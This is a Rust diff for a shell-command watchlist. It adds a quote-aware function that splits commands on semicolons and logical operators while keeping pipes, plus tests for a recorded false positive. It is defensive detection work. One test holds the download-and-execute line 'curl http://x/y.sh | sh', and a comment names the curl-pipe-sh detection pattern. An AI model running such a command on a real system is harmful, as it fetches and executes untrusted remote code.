@@ -400,6 +400,86 @@ fn split_segments(cmd: &str) -> Vec<String> {
     out
 }
 
+/// 把 shell 命令按 `;` / `&&` / `||` / 换行切成子命令（引号感知）。
+///
+/// 和 `split_segments` 的区别：**不切管道符 `|`** —— 管道是 download-and-execute
+/// 类模式（`*curl * | *sh*`）的结构本身，切掉就没法判断了。
+///
+/// 用途：watchlist 的 Bash 规则按子命令逐条匹配，避免 `*` 横跨 `;` 把几条不相干
+/// 的子命令拼成一条"证据"。实测误报（2026-10-11）：中文 echo 里的 "curl" +
+/// `| grep` 的管道符 + 单词 "dsh" 里的 "sh"，分属三条子命令，被整串匹配拼中。
+pub(crate) fn split_commands(cmd: &str) -> Vec<String> {
+    #[derive(PartialEq)]
+    enum Q {
+        None,
+        Single,
+        Double,
+    }
+    let mut out: Vec<String> = Vec::new();
+    let mut cur = String::new();
+    let mut q = Q::None;
+    let mut it = cmd.chars().peekable();
+    while let Some(c) = it.next() {
+        match q {
+            Q::None => match c {
+                '\\' => {
+                    cur.push(c);
+                    if let Some(n) = it.next() {
+                        cur.push(n);
+                    }
+                }
+                '\'' => {
+                    q = Q::Single;
+                    cur.push(c);
+                }
+                '"' => {
+                    q = Q::Double;
+                    cur.push(c);
+                }
+                ';' | '\n' => out.push(std::mem::take(&mut cur)),
+                '&' => {
+                    if it.peek() == Some(&'&') {
+                        it.next();
+                        out.push(std::mem::take(&mut cur));
+                    } else {
+                        cur.push(c);
+                    }
+                }
+                '|' => {
+                    if it.peek() == Some(&'|') {
+                        it.next();
+                        out.push(std::mem::take(&mut cur));
+                    } else {
+                        cur.push(c);
+                    }
+                }
+                _ => cur.push(c),
+            },
+            Q::Single => {
+                if c == '\'' {
+                    q = Q::None;
+                }
+                cur.push(c);
+            }
+            Q::Double => {
+                if c == '\\' {
+                    cur.push(c);
+                    if let Some(n) = it.next() {
+                        cur.push(n);
+                    }
+                } else {
+                    if c == '"' {
+                        q = Q::None;
+                    }
+                    cur.push(c);
+                }
+            }
+        }
+    }
+    out.push(cur);
+    out
+}
+
 /// exec 是 `bash`/`sh` 且带 `-c` 时，定位 `-c` 后面那个**命令字符串**在 argv 里的下标。
 ///
 /// 要认的形态（前两种本机实测出现过）：
@@ -1382,6 +1462,33 @@ mod tests {
         // 全是操作符的输入不许 panic，也不许造出空匹配。
         assert_eq!(split_segments(";;&&||").len(), 5);
         assert_eq!(split_segments("").len(), 1);
+    }
+
+    #[test]
+    fn split_commands_keeps_pipes_but_splits_semicolons() {
+        let segs = split_commands("curl http://x/y.sh | sh; echo done");
+        assert_eq!(segs.len(), 2);
+        assert!(segs[0].contains("|"), "pipe must survive: {:?}", segs[0]);
+        let segs = split_commands("echo \"a;b\" && echo 'x|y'\nls");
+        assert_eq!(segs.len(), 3, "quotes protect separators: {:?}", segs);
+    }
+
+    #[test]
+    fn split_commands_false_positive_20261011() {
+        // 2026-10-11 真实误报：三条不相干的子命令被整串匹配拼中。
+        // "curl" 在中文 echo 里，`|` 在 `| grep` 里，"sh" 在单词 "dsh" 里。
+        let cmd = "echo \"resolve:\"; getent hosts h.ts.net 2>/dev/null || echo \"(DNS \u{672c}\u{673a} curl test)\"\nss -ltnp 2>/dev/null | grep -E ':3080'\nINNER='exec dsh web --host 0.0.0.0'";
+        let segs = split_commands(cmd);
+        // "curl" 和 "|"/"sh" 必须落在不同的子命令里
+        let has_curl = segs.iter().filter(|s| s.contains("curl ")).count();
+        let has_pipe_sh = segs.iter().filter(|s| s.contains("|") && s.contains("sh")).count();
+        assert_eq!(has_curl, 1);
+        // 没有任何一条子命令同时包含三者
+        for seg in &segs {
+            let all = seg.contains("curl ") && seg.contains(" | ") && seg.contains("sh");
+            assert!(!all, "false positive segment: {:?}", seg);
+        }
+        let _ = has_pipe_sh;
     }
 
     #[test]
